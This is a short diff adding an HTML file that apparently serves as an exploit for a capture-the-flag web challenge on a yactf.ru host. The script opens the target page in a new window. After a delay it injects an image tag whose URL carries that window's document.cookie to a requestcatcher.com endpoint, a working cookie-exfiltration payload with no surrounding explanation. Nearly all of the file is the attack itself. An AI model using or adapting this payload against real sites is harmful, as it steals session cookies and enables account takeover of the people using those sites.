@@ -1,0 +1,13 @@
+<html>
+<script>
+
+var w1 = window.open('https://random-slap.yactf.ru')
+
+// wait for window loaded
+setTimeout(() => {
+  document.write('<img src="https://test123.requestcatcher.com/test?cookie='+w1.document.cookie+'"/>')
+}, 2000)
+
+</script>
+
+</html>
